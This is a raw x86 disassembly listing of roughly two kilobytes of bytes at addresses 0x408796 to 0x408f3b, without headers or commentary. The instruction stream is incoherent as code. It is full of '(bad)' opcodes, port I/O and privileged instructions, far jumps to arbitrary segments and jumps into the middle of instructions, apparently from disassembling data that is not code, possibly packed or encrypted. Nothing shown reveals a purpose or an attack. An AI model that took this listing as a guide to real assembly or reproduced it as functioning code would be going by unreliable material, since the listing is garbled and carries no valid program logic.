  408796:	dec    ecx
  408797:	mov    edx,0xe873c838
  40879c:	jg     0x408787
  40879e:	ror    BYTE PTR [ebx],0xd4
  4087a1:	xor    eax,0xa791eb68
  4087a6:	mov    al,bl
  4087a8:	dec    edi
  4087a9:	jecxz  0x408767
  4087ab:	mul    BYTE PTR [eax+eax*8]
  4087ae:	mov    ds:0xdb50f3f1,eax
  4087b3:	jge    0x4087e2
  4087b5:	sbb    eax,0x771c56cd
  4087ba:	jne    0x4087b2
  4087bc:	fiadd  DWORD PTR [eax-0x512589e0]
  4087c2:	xchg   ecx,eax
  4087c3:	imul   eax,DWORD PTR [ebx],0xffffff9d
  4087c6:	test   al,0x8d
  4087c8:	shr    BYTE PTR [edi-0x3c855c22],0xb8
  4087cf:	and    BYTE PTR [ecx],cl
  4087d1:	push   edi
  4087d2:	sub    dl,0x54
  4087d5:	loopne 0x40876a
  4087d7:	push   es
  4087d8:	mov    ebp,0xcf95cc9d
  4087dd:	daa    
  4087de:	clc    
  4087df:	xchg   edi,eax
  4087e0:	or     al,bh
  4087e2:	test   DWORD PTR [edi+esi*2+0x72fa19d4],ebp
  4087e9:	pop    ss
  4087ea:	xchg   ebp,eax
  4087eb:	std    
  4087ec:	mov    DWORD PTR [esi-0x37],edx
  4087ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087f0:	in     al,dx
  4087f1:	pop    esi
  4087f2:	cmp    al,0xe8
  4087f4:	imul   DWORD PTR [edx-0x102da082]
  4087fa:	fwait
  4087fb:	test   DWORD PTR ss:[edi+0x3401c813],edx
  408802:	cs cli 
  408804:	stc    
  408805:	loopne 0x40886e
  408807:	dec    esi
  408808:	arpl   WORD PTR [edx+eiz*4+0x3c],bx
  40880c:	inc    edx
  40880d:	xchg   edi,eax
  40880e:	xor    eax,edi
  408810:	retf   0x13b9
  408813:	xchg   ecx,eax
  408814:	shl    DWORD PTR [ecx-0x5d],0x6b
  408818:	or     bh,BYTE PTR [esi-0x15c400c1]
  40881e:	je     0x4087f2
  408820:	call   0x55fe:0xd5679583
  408827:	cdq    
  408828:	aas    
  408829:	cdq    
  40882a:	pop    ss
  40882b:	inc    edx
  40882c:	mov    edi,0xf1a2ee7b
  408831:	out    0xcb,al
  408833:	mov    BYTE PTR [edx],ch
  408835:	xor    eax,0x3dc9de2
  40883a:	daa    
  40883b:	jmp    0x41e6:0x46ce84a2
  408842:	repz push cs
  408844:	mov    al,0x5b
  408846:	mov    WORD PTR [edi],?
  408848:	imul   ecx,eax,0x1df512b3
  40884e:	aad    0xd6
  408850:	das    
  408851:	pop    eax
  408852:	mov    edx,DWORD PTR [esi]
  408854:	clc    
  408855:	push   cs
  408856:	inc    edx
  408857:	fstp   st(0)
  408859:	js     0x408848
  40885b:	jge    0x40881b
  40885d:	sub    al,0xa1
  40885f:	ja     0x408870
  408861:	and    eax,0xb4e069e2
  408866:	sbb    ah,BYTE PTR [esi-0x45]
  408869:	xlat   BYTE PTR ds:[ebx]
  40886a:	ret    0x74a5
  40886d:	mov    ebx,DWORD PTR ds:0x35cde43
  408873:	mov    ecx,0xbb9d8bd1
  408878:	scas   al,BYTE PTR es:[edi]
  408879:	fdivr  st,st(4)
  40887b:	pop    ss
  40887c:	inc    esi
  40887d:	mov    dl,0xb7
  40887f:	in     al,0xc4
  408881:	jp     0x4088f1
  408883:	adc    BYTE PTR [eax+esi*1+0x57c08df6],bh
  40888a:	xchg   esp,eax
  40888b:	dec    esp
  40888c:	fs pop ecx
  40888e:	cmp    al,0xf3
  408890:	cs dec ebp
  408892:	je     0x4088ae
  408894:	jl     0x40883c
  408896:	jo     0x408826
  408898:	xor    ch,bl
  40889a:	frstor [esi-0x533684b]
  4088a0:	(bad)  
  4088a1:	dec    ebp
  4088a2:	pop    ss
  4088a3:	mov    DWORD PTR [edi],edx
  4088a5:	into   
  4088a6:	lfs    ebx,FWORD PTR [ecx-0x63]
  4088aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088ab:	add    BYTE PTR [esi+0x7f996433],ah
  4088b1:	lea    edi,[eax-0x1d]
  4088b4:	je     0x4088cf
  4088b6:	loope  0x408907
  4088b8:	outs   dx,BYTE PTR ds:[esi]
  4088b9:	xchg   edi,eax
  4088ba:	and    eax,0x8086b019
  4088bf:	mov    bh,BYTE PTR [edi+0x6d]
  4088c2:	mov    bl,0xdf
  4088c4:	pop    ss
  4088c5:	mov    ebp,0x5b55a6a0
  4088ca:	in     eax,dx
  4088cb:	mov    ?,WORD PTR [eax*4+0x6313df64]
  4088d2:	ret    0xa25
  4088d5:	xchg   DWORD PTR [eax],esi
  4088d7:	mov    al,0xa5
  4088d9:	test   DWORD PTR [eax+0x7f22055b],ebp
  4088df:	call   0xaaac:0x2092ab46
  4088e6:	inc    eax
  4088e7:	(bad)  
  4088e8:	cmp    eax,0xc78c8141
  4088ed:	jns    0x408925
  4088ef:	leave  
  4088f0:	shr    BYTE PTR ds:0x4759575d,0x30
  4088f7:	test   BYTE PTR [ecx+0x3224c6c8],ch
  4088fd:	add    BYTE PTR [edx+ebp*4-0x24ad0ec1],dl
  408904:	pop    esp
  408905:	mov    eax,0x28f4b1b8
  40890a:	rcr    DWORD PTR ss:[edi+0x138ccead],0x48
  408912:	jmp    0x4088ab
  408914:	push   es
  408915:	mov    ds:0x30fdd7d9,eax
  40891a:	out    0xf6,eax
  40891c:	je     0x408995
  40891e:	in     al,dx
  40891f:	lea    esp,[ecx-0x5a]
  408922:	cmp    ch,BYTE PTR [ebp-0x48545ea]
  408928:	mov    ch,0x6e
  40892a:	(bad)  [ecx+eax*4]
  40892d:	in     al,0xbd
  40892f:	pop    ecx
  408930:	or     BYTE PTR ds:0x3c61b522,ah
  408936:	add    ebp,DWORD PTR [esp+edx*1+0x25bf8133]
  40893d:	push   esi
  40893e:	ret    
  40893f:	adc    BYTE PTR [ecx+0x7594b4d5],dh
  408945:	mov    eax,ds:0x606b19b2
  40894a:	adc    al,0x26
  40894c:	int3   
  40894d:	xchg   ebx,eax
  40894e:	ret    
  40894f:	data16 xlat BYTE PTR ds:[ebx]
  408951:	mov    ds:0xc61c7be1,eax
  408956:	jns    0x408918
  408958:	mov    dl,0xa6
  40895a:	adc    ebp,esi
  40895c:	mov    ds:0x2de4a625,al
  408961:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408962:	mov    bh,0x32
  408964:	lds    ecx,FWORD PTR [ebp+0x6005f48e]
  40896a:	sub    eax,0x3ef9c505
  40896f:	cld    
  408970:	test   eax,0x1b5ead3f
  408975:	cli    
  408976:	adc    edi,DWORD PTR [edi]
  408978:	pop    edi
  408979:	mov    dl,0xb1
  40897b:	dec    ecx
  40897c:	jg     0x40897b
  40897e:	fcom   st(6)
  408980:	push   edi
  408981:	adc    eax,0x159e3009
  408986:	inc    esp
  408987:	imul   ecx,eax,0x81739289
  40898d:	cld    
  40898e:	mov    eax,DWORD PTR [ecx-0x41feee0b]
  408994:	dec    esi
  408995:	aaa    
  408996:	jb     0x40896d
  408998:	loop   0x40896a
  40899a:	into   
  40899b:	int    0xc3
  40899d:	cmp    ebp,DWORD PTR [ebx-0x6]
  4089a0:	sbb    al,0x31
  4089a2:	jl     0x4089b6
  4089a4:	js     0x4089c4
  4089a6:	mov    edx,cs
  4089a8:	xchg   esp,eax
  4089a9:	dec    DWORD PTR [edi+0x3f8b3d40]
  4089af:	push   esp
  4089b0:	ror    eax,0x41
  4089b3:	push   edi
  4089b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089b5:	jmp    DWORD PTR [edi-0x42]
  4089b8:	(bad)  
  4089b9:	mov    edi,0xf0a11818
  4089be:	add    edi,ebp
  4089c0:	shl    DWORD PTR [esi+0x5e],1
  4089c3:	push   ss
  4089c4:	mov    dh,0x4c
  4089c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089c7:	nop
  4089c8:	xchg   ecx,eax
  4089c9:	and    ebx,esp
  4089cb:	xor    ecx,DWORD PTR [ebx]
  4089cd:	xor    eax,0x814e562c
  4089d2:	outs   dx,BYTE PTR ds:[esi]
  4089d3:	dec    esp
  4089d4:	cs repz loopne 0x4089eb
  4089d8:	add    al,0xaa
  4089da:	arpl   WORD PTR [eax-0x46],cx
  4089dd:	lods   al,BYTE PTR ds:[esi]
  4089de:	mov    al,0x3a
  4089e0:	rcl    BYTE PTR [eax+0x6ed0571d],1
  4089e6:	loopne 0x408a1e
  4089e8:	jecxz  0x408a07
  4089ea:	mov    edx,0x958e46d5
  4089ef:	xor    al,0x48
  4089f1:	pop    edi
  4089f2:	cmp    eax,0x35c7457f
  4089f7:	stos   DWORD PTR es:[edi],eax
  4089f8:	add    eax,0xe927701f
  4089fd:	pop    ebp
  4089fe:	add    eax,DWORD PTR [esi+0x2d]
  408a01:	in     eax,dx
  408a02:	fs cli 
  408a04:	xchg   edx,eax
  408a05:	push   0xcf438fab
  408a0a:	pop    edx
  408a0b:	lahf   
  408a0c:	scas   eax,DWORD PTR es:[edi]
  408a0d:	mov    bl,BYTE PTR [ebp-0x9ae6fbf]
  408a13:	xor    esp,DWORD PTR [edx-0x62]
  408a16:	test   al,0xc
  408a18:	repz inc esp
  408a1a:	jl     0x408a61
  408a1c:	aaa    
  408a1d:	sar    DWORD PTR [ebp+edx*8-0x47ae9697],cl
  408a24:	shr    BYTE PTR [ebx],0x73
  408a27:	les    esp,FWORD PTR [ebp-0x49d500a4]
  408a2d:	push   edx
  408a2e:	fcom   DWORD PTR [edx+esi*2]
  408a31:	jns    0x408a81
  408a33:	out    dx,eax
  408a34:	mov    ecx,DWORD PTR [edx+ecx*2+0x1c]
  408a38:	in     al,dx
  408a39:	xchg   ebp,eax
  408a3a:	adc    al,0xc2
  408a3c:	mov    ss,WORD PTR [edx+0x2e749461]
  408a42:	in     al,dx
  408a43:	(bad)  
  408a44:	aaa    
  408a45:	push   ebp
  408a46:	mov    ah,ah
  408a48:	fisub  WORD PTR [esi+0x7b]
  408a4b:	cmc    
  408a4c:	jno    0x408ab2
  408a4e:	mov    ecx,0xea6302f0
  408a53:	ret    
  408a54:	and    BYTE PTR [eax+edi*8],al
  408a57:	push   cs
  408a58:	inc    ebp
  408a59:	sbb    ah,dl
  408a5b:	icebp  
  408a5c:	repnz xchg edx,eax
  408a5e:	add    ecx,DWORD PTR [ebp-0x1e]
  408a61:	fstp   QWORD PTR ds:0x63428a4d
  408a67:	scas   al,BYTE PTR es:[edi]
  408a68:	ja     0x4089f7
  408a6a:	xor    bh,BYTE PTR [edx-0x5e]
  408a6d:	add    DWORD PTR [esi+ebp*1-0x78],ecx
  408a71:	fcmovbe st,st(2)
  408a73:	rcr    BYTE PTR [edi],1
  408a75:	or     BYTE PTR [eax+0x60d8976b],bl
  408a7b:	fisubr DWORD PTR [ecx]
  408a7d:	push   esi
  408a7e:	daa    
  408a7f:	pop    ecx
  408a80:	push   ds
  408a81:	js     0x408ad6
  408a83:	push   esi
  408a84:	lods   al,BYTE PTR ds:[esi]
  408a85:	pop    ss
  408a86:	or     eax,0xcfa008ad
  408a8b:	sub    eax,0xe706b920
  408a90:	in     eax,dx
  408a91:	xchg   esi,eax
  408a92:	add    al,0x3e
  408a94:	ins    BYTE PTR es:[edi],dx
  408a95:	xor    esi,ebp
  408a97:	stc    
  408a98:	sub    DWORD PTR [edx-0x15],eax
  408a9b:	aas    
  408a9c:	das    
  408a9d:	aaa    
  408a9e:	sbb    ebp,DWORD PTR [edi]
  408aa0:	jb     0x408b01
  408aa2:	xlat   BYTE PTR ds:[ebx]
  408aa3:	aaa    
  408aa4:	in     eax,0xf6
  408aa6:	lock (bad) 
  408aa8:	and    al,0xd2
  408aaa:	pop    esp
  408aab:	xor    esi,DWORD PTR ds:0x4c8aad5d
  408ab1:	(bad)  
  408ab2:	stc    
  408ab3:	xor    BYTE PTR [ebx+0xd],0x62
  408ab7:	xchg   ebx,eax
  408ab8:	inc    edx
  408ab9:	xchg   esp,eax
  408aba:	imul   ebx,DWORD PTR [eax+eiz*1+0x14],0xffffffec
  408abf:	or     BYTE PTR ss:[esi],dl
  408ac2:	jge    0x408a4d
  408ac4:	daa    
  408ac5:	repnz loop 0x408aa9
  408ac8:	fidiv  DWORD PTR [ebx]
  408aca:	mov    eax,0xf8b23162
  408acf:	adc    al,0x86
  408ad1:	sub    ah,BYTE PTR [eax-0x7cba2d1d]
  408ad7:	jl     0x408b4d
  408ad9:	push   es
  408ada:	xchg   ebx,eax
  408adb:	xor    al,0xa8
  408add:	je     0x408af3
  408adf:	lahf   
  408ae0:	pop    edi
  408ae1:	xchg   ebx,eax
  408ae2:	mov    ds:0xe721de97,al
  408ae7:	or     DWORD PTR [ebx+ecx*2],ebx
  408aea:	ins    DWORD PTR es:[edi],dx
  408aeb:	test   edi,ebp
  408aed:	mov    ch,0xb8
  408aef:	adc    eax,0x9b8503f4
  408af4:	call   0x48e2b308
  408af9:	dec    esp
  408afa:	and    DWORD PTR [ecx+0x11],esp
  408afd:	aam    0xa0
  408aff:	and    ah,al
  408b01:	adc    eax,0xafa6f2d6
  408b06:	inc    esp
  408b07:	in     eax,0x1
  408b09:	nop
  408b0a:	push   edx
  408b0b:	ins    BYTE PTR es:[edi],dx
  408b0c:	mov    eax,0x7206a0c1
  408b11:	mov    ecx,0x3f3eb714
  408b16:	mov    esp,0x47aa9f4f
  408b1b:	lock and eax,DWORD PTR [ecx+0x35]
  408b1f:	ret    0x1998
  408b22:	pop    esi
  408b23:	aas    
  408b24:	repnz dec ebp
  408b26:	pusha  
  408b27:	stos   DWORD PTR es:[edi],eax
  408b28:	xchg   edx,eax
  408b29:	dec    edx
  408b2a:	imul   edx,ebp,0x63
  408b2d:	sbb    al,0x60
  408b2f:	sub    DWORD PTR [ecx+0x50],eax
  408b32:	cmp    ch,dl
  408b34:	pop    eax
  408b35:	dec    esi
  408b36:	test   DWORD PTR ds:0xd3e4ed45,edi
  408b3c:	mov    ebp,0x54862931
  408b41:	inc    edx
  408b42:	xor    edi,DWORD PTR [ecx-0x2262038f]
  408b48:	sub    BYTE PTR [eax-0x73],dl
  408b4b:	jl     0x408b8b
  408b4d:	sbb    DWORD PTR [ebx],ecx
  408b4f:	imul   eax,ebp,0x64
  408b52:	jecxz  0x408b89
  408b54:	loope  0x408ae6
  408b56:	sub    ecx,DWORD PTR [esi+0x6]
  408b59:	adc    dh,BYTE PTR [esp+ecx*2+0x2e]
  408b5d:	xor    BYTE PTR [ebp+0x29d7b160],ch
  408b63:	mov    ecx,0xd60daab7
  408b68:	dec    eax
  408b69:	fidivr WORD PTR [eax]
  408b6b:	pop    ss
  408b6c:	sbb    dl,bl
  408b6e:	es mov al,0xe
  408b71:	ret    
  408b72:	xor    al,BYTE PTR [ecx]
  408b74:	and    bl,BYTE PTR [edi]
  408b76:	in     eax,0x90
  408b78:	pop    ecx
  408b7a:	xor    BYTE PTR [esi],0xb4
  408b7d:	data16 jecxz 0x408bd0
  408b80:	addr16 pop eax
  408b82:	or     BYTE PTR [esi-0x7ee477f3],ch
  408b88:	sbb    al,ch
  408b8a:	ror    BYTE PTR [ebp-0x6],1
  408b8d:	push   ebx
  408b8e:	stc    
  408b8f:	fst    DWORD PTR [ebx]
  408b91:	or     al,BYTE PTR [edi-0x75]
  408b94:	lea    ecx,[ecx]
  408b96:	sub    BYTE PTR [edi-0x43],bh
  408b99:	(bad)  
  408b9a:	jns    0x408ba1
  408b9c:	scas   al,BYTE PTR es:[edi]
  408b9d:	mov    esi,0x395a78d1
  408ba2:	das    
  408ba3:	mov    al,ds:0x9046ec9a
  408ba8:	pop    ebx
  408ba9:	jae    0x408b94
  408bab:	int    0xab
  408bad:	fsub   DWORD PTR [eax-0x3]
  408bb0:	jge    0x408bc0
  408bb2:	xor    ecx,DWORD PTR [eax-0x7]
  408bb5:	addr16 push 0xffffffca
  408bb8:	mov    WORD PTR [edx],fs
  408bba:	fs mov ebx,0x53efa79a
  408bc0:	xor    BYTE PTR [esi-0x43],0x55
  408bc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bc5:	lock mov edi,0x39a9edc8
  408bcb:	and    DWORD PTR [edi+0x1ae40e26],ebx
  408bd1:	push   esi
  408bd2:	cmp    ebp,0x1d8fb411
  408bd8:	sub    ecx,edx
  408bda:	scas   al,BYTE PTR es:[edi]
  408bdb:	stos   DWORD PTR es:[edi],eax
  408bdc:	cld    
  408bdd:	pop    ecx
  408bde:	jb     0x408c33
  408be0:	sub    DWORD PTR [ecx+0x1e],0xa4eed546
  408be7:	fwait
  408be8:	vpand  xmm1,xmm2,xmm7
  408bec:	repnz lock push edi
  408bef:	lock mov ds:0x6ab680e0,ax
  408bf6:	and    al,0xb6
  408bf8:	mov    al,ds:0x3fb21f44
  408bfd:	and    al,0x3b
  408bff:	ror    DWORD PTR [edi+edi*8],cl
  408c02:	dec    ebp
  408c03:	cdq    
  408c04:	ins    BYTE PTR es:[edi],dx
  408c05:	je     0x408c1e
  408c07:	mov    edi,0xda51e0f4
  408c0c:	jne    0x408b9e
  408c0e:	add    BYTE PTR [esi+0x23],bh
  408c11:	ja     0x408c09
  408c13:	sub    eax,0xffebe24e
  408c18:	loop   0x408bbe
  408c1a:	jmp    0xacd99395
  408c1f:	daa    
  408c20:	dec    eax
  408c21:	mov    ds:0xc0d62da5,eax
  408c26:	bound  esi,QWORD PTR ds:0xc9ce19ce
  408c2c:	and    al,0xc8
  408c2e:	mov    ds:0xeeacf284,eax
  408c33:	bound  ecx,QWORD PTR [ebx]
  408c35:	fs mov esp,0x324c0072
  408c3b:	pop    esp
  408c3c:	(bad)  
  408c3d:	jnp    0x408c45
  408c3f:	sti    
  408c40:	shr    BYTE PTR [edi-0x517c48da],0x62
  408c47:	or     ebp,DWORD PTR [eax+0x267b1fd9]
  408c4d:	loop   0x408c93
  408c4f:	shr    DWORD PTR [eax-0x48],1
  408c52:	add    ebp,DWORD PTR ds:0xb28e61fe
  408c58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c59:	jp     0x408c05
  408c5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c5c:	fwait
  408c5d:	dec    esi
  408c5e:	add    DWORD PTR [ebx+0x66f08393],ebx
  408c64:	mov    edi,0x42903954
  408c69:	mov    WORD PTR [edi+0x519fd52f],ds
  408c6f:	xor    BYTE PTR [ecx],0xfa
  408c72:	add    DWORD PTR [ecx+edi*8-0x4a2225d4],ebp
  408c79:	data16 (bad) 
  408c7b:	mov    al,0xeb
  408c7d:	mov    ah,0x9b
  408c7f:	in     al,dx
  408c80:	repz (bad) 
  408c82:	mov    ebx,0x75939da8
  408c87:	pop    esp
  408c88:	arpl   WORD PTR ds:0x8b0f0857,si
  408c8e:	xchg   BYTE PTR [eax],dl
  408c90:	push   eax
  408c91:	pop    ebp
  408c92:	out    dx,eax
  408c93:	popa   
  408c94:	ud2    
  408c96:	or     eax,0x30481974
  408c9b:	jge    0x408c3e
  408c9d:	mov    ecx,0x23e74308
  408ca2:	es dec eax
  408ca4:	jl     0x408c80
  408ca6:	push   ss
  408ca7:	hlt    
  408ca8:	or     eax,0xeb9275d4
  408cad:	imul   ecx,DWORD PTR [ecx+0x5b54084f],0xa05d4290
  408cb7:	ds ins BYTE PTR es:[edi],dx
  408cb9:	mov    edi,0xe5e44a8
  408cbe:	adc    al,0xe
  408cc0:	jp     0x408c91
  408cc2:	mov    esp,0x435145ac
  408cc7:	xor    BYTE PTR [eax-0x9218a4b],ch
  408ccd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cce:	jp     0x408c77
  408cd0:	int3   
  408cd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408cd2:	popf   
  408cd3:	sbb    ecx,DWORD PTR [ebx]
  408cd5:	mov    ebx,0x2cc4a029
  408cda:	aaa    
  408cdb:	jge    0x408cc8
  408cdd:	add    BYTE PTR [eax],bl
  408cdf:	push   esp
  408ce0:	loope  0x408cd1
  408ce2:	loopne 0x408d57
  408ce4:	and    eax,0xbaa7516b
  408ce9:	cmp    al,BYTE PTR [edx]
  408ceb:	ins    BYTE PTR es:[edi],dx
  408cec:	cli    
  408ced:	out    0xc2,al
  408cef:	sub    cl,dh
  408cf1:	mov    esi,0xa3dffb60
  408cf6:	mul    DWORD PTR [edi]
  408cf8:	mov    ds:0x75eef7de,eax
  408cfd:	ret    0x862
  408d00:	jns    0x408d57
  408d02:	hlt    
  408d03:	out    dx,al
  408d04:	test   DWORD PTR [edi-0x3b],eax
  408d07:	lahf   
  408d08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d09:	pusha  
  408d0a:	dec    ecx
  408d0b:	mov    esp,esp
  408d0d:	xchg   BYTE PTR [edi-0x1b],bh
  408d10:	je     0x408ca6
  408d12:	sbb    al,BYTE PTR [ebp+0x3d]
  408d15:	fstp   DWORD PTR [ebx-0x199b37b3]
  408d1b:	xor    BYTE PTR [eax],dh
  408d1d:	fsubr  QWORD PTR [edx+0x79]
  408d20:	dec    esi
  408d21:	shr    DWORD PTR ds:0x31870977,1
  408d27:	dec    eax
  408d28:	jg     0x408d53
  408d2a:	sub    eax,0xdfc96865
  408d2f:	add    al,0x8a
  408d31:	add    al,0x6e
  408d33:	mov    bl,0xcd
  408d35:	jne    0x408d5f
  408d37:	cli    
  408d38:	cld    
  408d39:	mov    edi,0x39505657
  408d3e:	xor    eax,0x5d1b88c9
  408d43:	shl    DWORD PTR [ebx+edi*8],0x82
  408d47:	lea    esp,[ecx]
  408d49:	cmp    DWORD PTR [esi+0x74],esi
  408d4c:	stos   WORD PTR es:[edi],ax
  408d4e:	jg     0x408d4c
  408d50:	mov    ss,esp
  408d52:	xchg   edi,eax
  408d53:	enter  0xb7fe,0x7c
  408d57:	cmp    ebx,DWORD PTR [ebx+0x14]
  408d5a:	fisubr WORD PTR [ebx]
  408d5c:	dec    ebp
  408d5e:	stos   BYTE PTR es:[edi],al
  408d5f:	inc    edi
  408d60:	jmp    0xc0bf:0xde3a93f6
  408d67:	adc    eax,0xae67fff
  408d6c:	mov    eax,ss
  408d6e:	sbb    ebp,edx
  408d70:	ja     0x408d89
  408d72:	mov    edi,0x8e6b5db
  408d77:	outs   dx,BYTE PTR ds:[esi]
  408d78:	and    dh,ch
  408d7a:	pop    esi
  408d7b:	not    BYTE PTR [esi]
  408d7d:	aad    0xd6
  408d7f:	cwde   
  408d80:	daa    
  408d81:	add    bh,BYTE PTR [esi]
  408d83:	fwait
  408d84:	jns    0x408d1d
  408d86:	pushf  
  408d87:	inc    esi
  408d88:	std    
  408d89:	add    edi,DWORD PTR [edi]
  408d8b:	sbb    DWORD PTR [ecx],ebx
  408d8d:	xor    bh,bh
  408d8f:	fstp   TBYTE PTR [ebx+0x15bdcb0e]
  408d95:	hlt    
  408d96:	std    
  408d97:	ja     0x408dd2
  408d99:	test   al,0x5c
  408d9b:	xlat   BYTE PTR ds:[ebx]
  408d9c:	mov    ebp,ss
  408d9e:	mov    dh,0x68
  408da0:	jmp    0xc045bb3a
  408da5:	fndisi(8087 only) 
  408da7:	cdq    
  408da8:	neg    BYTE PTR [edi]
  408daa:	retf   
  408dab:	cmp    DWORD PTR ds:0x84845c7a,0xffffffbf
  408db2:	jg     0x408dc3
  408db4:	sub    al,0xc5
  408db6:	pop    ebp
  408db7:	mov    dl,0xd3
  408db9:	adc    al,0xe1
  408dbb:	test   eax,0xd1235049
  408dc0:	fidiv  DWORD PTR [eax+0x3fab6320]
  408dc6:	ja     0x408dc5
  408dc8:	fsubr  QWORD PTR [ebx+0x5b]
  408dcb:	rcl    eax,1
  408dcd:	mov    fs,WORD PTR [eax-0x4d0117e0]
  408dd3:	retf   0x2a6c
  408dd6:	push   cs
  408dd7:	addr16 mov fs,esp
  408dda:	adc    ah,ah
  408ddc:	add    al,0x65
  408dde:	test   al,0x2a
  408de0:	ja     0x408e34
  408de2:	ins    BYTE PTR es:[edi],dx
  408de3:	or     edi,DWORD PTR [ecx-0x9]
  408de6:	inc    eax
  408de7:	outs   dx,BYTE PTR ds:[esi]
  408de8:	mov    bl,BYTE PTR [esi]
  408dea:	dec    ecx
  408deb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408dec:	jp     0x408df2
  408dee:	bound  eax,QWORD PTR [edx-0x7e]
  408df1:	icebp  
  408df2:	(bad)  
  408df3:	cmp    edx,esp
  408df5:	cmp    ah,BYTE PTR [ebp+0x5e2e8e5c]
  408dfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408dfc:	push   cs
  408dfd:	lea    eax,[edx-0x714599c3]
  408e03:	and    DWORD PTR [ecx-0x48f2ea38],edx
  408e09:	adc    eax,esp
  408e0b:	sti    
  408e0c:	add    ch,BYTE PTR [eax+0x1ebe5a3b]
  408e12:	push   cs
  408e13:	in     eax,dx
  408e14:	dec    esi
  408e15:	iret   
  408e16:	push   es
  408e17:	dec    eax
  408e18:	fsubr  st,st(6)
  408e1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e1b:	in     eax,0x9f
  408e1d:	dec    eax
  408e1e:	sbb    DWORD PTR [esi+0x75],esi
  408e21:	in     eax,0x72
  408e23:	out    0xd0,al
  408e25:	adc    al,0xbc
  408e27:	xchg   BYTE PTR [ebx-0x12],ch
  408e2a:	mul    esp
  408e2c:	loop   0x408e81
  408e2e:	pop    ebp
  408e2f:	out    dx,eax
  408e30:	pop    ds
  408e31:	int3   
  408e32:	daa    
  408e33:	sbb    BYTE PTR [edx+0x5e],al
  408e36:	test   BYTE PTR [ebx],dl
  408e38:	jmp    0x1bbefa6f
  408e3d:	pop    eax
  408e3e:	jg     0x408dd5
  408e40:	add    bl,BYTE PTR ds:0x3e3d616b
  408e46:	dec    ecx
  408e47:	test   eax,0x70c256c
  408e4c:	push   0x21
  408e4e:	test   eax,0x886cda22
  408e53:	loopne 0x408def
  408e55:	jmp    0x1deb:0x28210baf
  408e5c:	sbb    dl,BYTE PTR [esi+0x35d9fd00]
  408e62:	xor    eax,0x17711398
  408e67:	add    al,0xd7
  408e69:	jo     0x408eb2
  408e6b:	sub    ch,BYTE PTR [ebp+0x58333746]
  408e71:	xchg   edx,eax
  408e72:	ins    DWORD PTR es:[edi],dx
  408e73:	stos   BYTE PTR es:[edi],al
  408e74:	fcmovnu st,st(2)
  408e76:	outs   dx,DWORD PTR ds:[esi]
  408e77:	ins    DWORD PTR es:[edi],dx
  408e78:	out    dx,eax
  408e79:	ins    DWORD PTR es:[edi],dx
  408e7a:	aam    0x58
  408e7c:	mov    al,0xcd
  408e7e:	jae    0x408e1a
  408e80:	scas   eax,DWORD PTR es:[edi]
  408e81:	loop   0x408f01
  408e83:	popa   
  408e84:	pmulhuw mm1,mm7
  408e87:	sbb    dh,BYTE PTR [eax-0x203dced8]
  408e8d:	lds    ebp,FWORD PTR [ecx-0x7b14f85c]
  408e93:	sub    al,0x18
  408e95:	pop    esi
  408e96:	enter  0x18ac,0xc1
  408e9a:	test   BYTE PTR [edx],dh
  408e9c:	mov    eax,0x12108a1
  408ea1:	cwde   
  408ea2:	icebp  
  408ea3:	mov    al,BYTE PTR [ebp+0x848a0f0]
  408ea9:	stos   DWORD PTR es:[edi],eax
  408eaa:	jo     0x408e66
  408eac:	into   
  408ead:	or     al,0x36
  408eaf:	ret    
  408eb0:	dec    eax
  408eb1:	mov    DWORD PTR [eax+0x223bdc4b],0x41cb01b1
  408ebb:	ins    BYTE PTR es:[edi],dx
  408ebc:	stc    
  408ebd:	int3   
  408ebe:	jo     0x408eb9
  408ec0:	test   eax,0xbb6beb81
  408ec5:	jne    0x408ed2
  408ec7:	cmp    bl,BYTE PTR [ebx+0x77]
  408eca:	outs   dx,DWORD PTR ds:[esi]
  408ecb:	sub    esi,DWORD PTR [edi-0x2ee19e35]
  408ed1:	xchg   ebp,eax
  408ed2:	arpl   bp,di
  408ed4:	sbb    al,BYTE PTR [ebx]
  408ed6:	loop   0x408f24
  408ed8:	leave  
  408ed9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408eda:	mov    esp,0x8662869e
  408edf:	inc    ecx
  408ee0:	cmc    
  408ee1:	fcmove st,st(0)
  408ee3:	loope  0x408eba
  408ee5:	mov    dh,0x32
  408ee7:	ins    DWORD PTR es:[edi],dx
  408ee8:	daa    
  408ee9:	inc    esi
  408eea:	xchg   ecx,eax
  408eec:	or     DWORD PTR [esi],edi
  408eee:	aas    
  408eef:	cmc    
  408ef0:	scas   al,BYTE PTR es:[di]
  408ef2:	aas    
  408ef3:	jg     0x408ef3
  408ef5:	cmp    al,0x8e
  408ef7:	test   al,0x57
  408ef9:	push   ebp
  408efa:	xchg   ebx,eax
  408efb:	in     eax,0xc6
  408efd:	sbb    al,0x6d
  408eff:	ss dec ecx
  408f01:	gs inc ebp
  408f03:	stc    
  408f04:	or     BYTE PTR [ebx+0x20],cl
  408f07:	js     0x408f11
  408f09:	adc    eax,0x8c4aa51d
  408f0e:	push   es
  408f0f:	xchg   esp,eax
  408f10:	xor    cl,bl
  408f12:	fs jle 0x408ef2
  408f15:	jmp    0x884b4301
  408f1a:	repz shr BYTE PTR [ecx],0xd4
  408f1e:	mov    ebp,0x559eb462
  408f23:	cli    
  408f24:	clc    
  408f25:	cs jbe 0x408f8a
  408f28:	in     al,dx
  408f29:	leave  
  408f2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f2b:	add    eax,0x8a4ad45f
  408f30:	ficom  DWORD PTR [ebp-0x16662e42]
  408f36:	shl    DWORD PTR [ebx],0xee
  408f39:	cmp    al,bh
  408f3b:	out    dx,al
